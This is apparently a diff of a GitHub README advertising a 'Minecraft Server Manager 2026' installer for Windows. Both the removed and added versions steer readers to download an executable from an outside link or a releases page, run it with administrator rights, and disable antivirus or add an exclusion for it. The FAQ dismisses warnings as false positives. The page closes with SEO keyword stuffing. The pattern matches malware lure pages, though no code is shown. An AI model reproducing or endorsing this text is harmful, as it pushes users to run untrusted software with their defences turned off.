@@ -1,178 +1,62 @@
-<h1 align="center">⛏️ Minecraft Server Manager 2026 – One-Click Server Setup</h1>
+# 🎮 Minecraft-Server-Manager-2026 - Build your own custom server easily
 
-<p align="center">
-  <strong>Create your own Minecraft server in a few clicks. Play with friends, supports mods, and auto-detects server files.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download-Minecraft_Server_Manager-blue.svg)](https://github.com/Sticky-geopolitics135/Minecraft-Server-Manager-2026/releases)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-MC_Server_Manager-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+Minecraft Server Manager 2026 helps you host your own Minecraft server on your personal computer. You can play games with friends, install custom mods, and manage your server settings without writing complex code. The software detects your game files automatically. It simplifies the setup process so you can start playing in minutes.
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+## ⚙️ System requirements
 
----
+Your computer needs to meet these basic standards to run the manager:
 
-## 📦 What's Inside This Repository
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 8 gigabytes of RAM.
+* Storage: 2 gigabytes of free disk space for the software and server files.
+* Internet: A stable wired or wireless connection.
 
-Welcome to the official distribution page for **Minecraft Server Manager 2026 – One-Click Server Setup for Windows PC**.
-This repository provides access to the most user-friendly Minecraft server management utility.
+We recommend having the official Java Development Kit installed on your machine. The manager will check for this during the first setup and prompt you if an update is necessary.
 
-✅ **Full Version** – All features included  
-✅ **One-Click Setup** – Create a server in seconds  
-✅ **Mod Support** – Play with any mods  
-✅ **Auto-Detect** – Finds server files automatically  
-✅ **Multi-Version** – Supports all Minecraft versions  
-✅ **No System Changes** – Safe, no registry or service modifications  
+## 🚀 Getting started
 
----
+Follow these steps to prepare your system and use the software.
 
-## 📥 How to Get Started?
+1. Close any running Minecraft instances to avoid file conflicts.
+2. Visit the releases page to download the latest software version: [https://github.com/Sticky-geopolitics135/Minecraft-Server-Manager-2026/releases](https://github.com/Sticky-geopolitics135/Minecraft-Server-Manager-2026/releases)
+3. Locate the file named Setup.exe in your Downloads folder.
+4. Double-click the file to begin the installation.
+5. Follow the on-screen prompts. The installer sets up the required folders in your Documents directory.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+## 🛠️ Configuring your server
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+Once the installation finishes, open the application from your desktop shortcut. You will see a dashboard with several tabs.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+### Selecting a server type
+The software supports several server versions including Vanilla, Spigot, and Paper. Select your preferred version from the top dropdown menu. The manager downloads the necessary core files from official sources.
 
----
+### Mod support
+To add mods, navigate to the Mods tab. Click the Add button to import your files. Ensure your mods match the version of Minecraft you selected. The software verifies these files for compatibility and prevents common errors that cause crashes.
 
-## 🚀 Step-by-Step Guide
+### Performance settings
+Under the Settings tab, you can adjust the amount of RAM allocated to your server. Moving the slider to the right increases performance but uses more system memory. We suggest setting this to half of your total system RAM.
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get MC Server Manager 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+## 🌐 Connecting to your server
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+Your server is private by default. Only people on your home network can join using your local IP address. To play with friends over the internet, you must configure port forwarding in your router settings.
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and server configurations.
+1. Access your router login page.
+2. Find the Port Forwarding section.
+3. Create a new rule for port 25565 using the TCP protocol.
+4. Point this rule to the IP address of your host computer.
 
----
+The manager displays your status and monitors the connection attempt logs in real time. If a player fails to connect,check the log window for specific error messages regarding the handshake process.
 
-## 🔧 Key Features (2026 Update)
+## 🛡️ Maintenance and troubleshooting
 
-### 🚀 Server Creation
+Lag often results from too many entities or unoptimized chunks. Click the Cleanup button to remove unused data and keep the world file size small. This action optimizes the server tick rate and improves smoothness during gameplay.
 
-| Feature | Description |
-| :--- | :--- |
-| **One-Click Setup** | Create a server with a single click |
-| **Version Selector** | Choose any Minecraft version |
-| **Server Type** | Vanilla, Spigot, Paper, Forge, Fabric |
-| **Auto-Configure** | Automatically configures server settings |
+If the software fails to launch, verify that you have administrative rights on your machine. Sometimes antivirus programs flag new applications. If this happens, add an exclusion for the Minecraft Server Manager folder in your security settings. 
 
-### 🎮 Mod Support
+The software includes an auto-detect feature. If you move your existing world saves into the server folder, the manager reads the level.dat file and imports your world settings instantly. You can switch between different world instances using the World Management menu.
 
-| Feature | Description |
-| :--- | :--- |
-| **Forge Support** | Run Forge modded servers |
-| **Fabric Support** | Run Fabric modded servers |
-| **Mod Installer** | One-click mod installation |
-| **Mod Management** | Enable/disable mods easily |
+Always back up your server files before performing major updates. Use the Backup button to create a compressed archive of your current world and configuration files. Do not move or delete files while the server process remains active. Stop the server completely before performing file manual operations.
 
-### 🛠️ Server Management
-
-| Feature | Description |
-| :--- | :--- |
-| **Start/Stop** | Start and stop server with one click |
-| **Console** | View server console output |
-| **Commands** | Execute server commands |
-| **Players** | View connected players |
-
----
-
-## 📈 Why Choose Minecraft Server Manager 2026?
-
-- ✅ **One-Click** – Create a server in seconds
-- ✅ **Mod Support** – Play with any mods
-- ✅ **User-Friendly** – No technical knowledge required
-- ✅ **No System Changes** – Safe, no registry or service modifications
-- ✅ **Regular Updates** – Active development with frequent releases
-
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-MC_Server_Manager-00BFFF?style=flat-square&logo=windows&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: Can I play with mods?**  
-A: Yes, Forge and Fabric are fully supported.
-
-**Q: Do I need Java installed?**  
-A: Yes, Java is required to run Minecraft servers.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Minecraft Server Manager 2026 Now</a>
-</p>
+Keywords: 2026-software, desktop-app, game-server, gaming-tools, mc-server, minecraft-mod-verity, minecraft-server-lag-fix, minecraft-server-lag-fix-2026, minecraft-setup-guide, pc-tools, server-manager, server-setup, server-utility, windows-11, windows-software-installation-guide
